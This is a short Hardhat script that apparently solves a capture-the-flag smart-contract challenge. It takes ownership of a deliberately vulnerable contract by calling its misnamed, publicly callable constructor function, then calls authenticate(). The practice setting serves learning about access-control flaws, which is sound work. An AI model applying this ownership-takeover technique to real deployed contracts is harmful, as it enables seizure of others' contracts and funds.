import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0x10EC9C745717B9806a281d6a9Eb9d5fB10E12BCE";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "AssumeOwnershipChallenge",
    challengeAddress
  );

  let tx = await challengeContract.connect(player).AssumeOwmershipChallenge();
  console.log(await tx.wait());

  tx = await challengeContract.connect(player).authenticate();
  console.log(await tx.wait());
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
